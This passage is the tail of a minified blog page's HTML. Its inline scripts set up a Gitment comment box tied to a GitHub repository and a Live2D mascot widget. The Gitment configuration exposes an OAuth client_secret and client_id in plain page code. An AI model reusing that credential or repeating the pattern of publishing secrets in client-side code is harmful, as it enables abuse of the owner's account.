Gitmint({id:window.location.pathname,owner:"Lzy-wi",repo:"gitment-comments",lang:navigator.language||navigator.systemLanguage||navigator.userLanguage,oauth:{client_secret:"f505e0931d7b3481f41ba49d0a62c32ed958ab03",client_id:"a6008e5dc6be6020bf5f"}}).render("gitment-container")}renderGitment()</script><script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({pluginRootPath:"live2dw/",pluginJsPath:"lib/",pluginModelPath:"assets/",tagMode:!1,log:!1,model:{jsonPath:"/live2dw/assets/nico.model.json"},display:{position:"right",width:100,height:200},mobile:{show:!1}})</script></body></html>